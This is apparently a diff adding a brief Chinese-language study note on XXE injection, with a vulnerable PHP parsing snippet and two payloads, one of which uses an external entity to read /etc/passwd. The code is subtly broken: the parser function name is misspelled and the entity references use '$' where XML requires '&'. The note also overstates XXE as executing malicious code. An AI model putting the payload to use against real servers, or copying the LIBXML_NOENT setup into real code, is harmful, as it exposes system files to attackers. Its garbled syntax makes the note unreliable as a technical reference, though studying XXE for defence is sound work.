@@ -1,0 +1,26 @@
+XXE
+
+描述：通过注入XML，执行恶意代码，可以支持file，http等协议、伪协议（file可用于读取文件，http可用于访问内部其他主机，或进行端口转发）
+
+原理：
+
+php：
+  $xm1 = file_get_contents("php://input");    # 用户可控的xml输入
+  $data = simplexm1_load_string($xm1, 'SimpleXMLElement', LIBXML_NOENT);    # 将用户输入转换为xml，后面LIBXML_NOENT表示开关（是否支持访问外部，默认关闭，需要代码中明确标注开启，才存在XXE漏洞）
+  echo $data;
+
+payload：
+
+  # 内部实体注入
+  <?xml version = "1.0"?>
+  <!DOCTYPE note [
+      <!ENTITY hacker "12345">
+  ]>
+  <name>$hacker;</name>
+
+  # 外部实体注入
+  <?xml version = "1.0"?>
+  <!DOCTYPE ANY [
+      <!ENTITY hacker SYSTEM "file:///etc/passwd">
+  ]>
+  <x>$hacker;</x>    # 这里写x可以，也可以直接写变量
